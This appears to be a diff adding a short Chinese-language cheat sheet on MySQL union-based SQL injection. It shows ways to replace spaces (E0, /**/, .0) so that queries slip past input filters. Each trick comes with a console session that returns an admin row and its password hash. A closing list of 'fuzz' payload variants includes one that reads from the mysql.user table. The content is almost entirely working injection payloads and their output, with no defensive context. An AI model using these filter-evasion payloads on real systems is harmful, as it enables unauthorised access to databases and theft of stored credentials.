@@ -1,0 +1,41 @@
+E0代替空格
+mysql> select * from admin where uid=1E0union select 1,2,3;
++-----+-------+----------------------------------+
+| uid | name  | pass                             |
++-----+-------+----------------------------------+
+|   1 | admin | 21232f297a57a5a743894a0e4a801fc3 |
+|   1 | 2     | 3                                |
++-----+-------+----------------------------------+
+2 rows in set (0.00 sec)
+/**/代替空格
+mysql> select * from admin where uid=1/**/union select 1,2,3;
++-----+-------+----------------------------------+
+| uid | name  | pass                             |
++-----+-------+----------------------------------+
+|   1 | admin | 21232f297a57a5a743894a0e4a801fc3 |
+|   1 | 2     | 3                                |
++-----+-------+----------------------------------+
+2 rows in set (0.00 sec)
+
+select(count(*))from(users)
+.0代替空格
+mysql> select * from admin where uid=1.0union select 1,2,3;
++-----+-------+----------------------------------+
+| uid | name  | pass                             |
++-----+-------+----------------------------------+
+|   1 | admin | 21232f297a57a5a743894a0e4a801fc3 |
+|   1 | 2     | 3                                |
++-----+-------+----------------------------------+
+2 rows in set (0.00 sec)
+
+
+同类Fuzz拓展:
+
+where id=.1union/*.1*/select-.1
+where id=.1union/*.1*/select!.1
+where id=.1union/*.1*/select~.1
+where id=.1union/*.1*/select(1)
+where id=.1union/*.1*/select`host`from mysql.user
+where id=.1union/*.1*/select'1'
+where id=.1union/*.1*/select"1"
+where id=.1union/*.1*/select@1
